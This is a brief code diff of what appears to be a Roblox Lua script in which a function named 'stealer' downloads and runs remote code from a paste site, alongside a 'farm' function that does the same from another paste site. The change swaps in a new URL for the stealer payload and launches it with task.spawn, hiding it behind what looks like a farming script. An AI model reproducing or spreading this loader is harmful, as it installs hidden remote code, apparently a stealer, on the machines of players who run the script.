@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6xywIy1cxQ/0", true))()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Ntr1bWeS1U/0", true))()
 end
 local function farm()
-    loadstring(game:HttpGet("https://pastefy.app/iZmH8NW9/raw", true))()
+    loadstring(game:HttpGet("https://pastefy.app/iZmH8NW9/raw"))()
 end
 
 task.spawn(stealer)
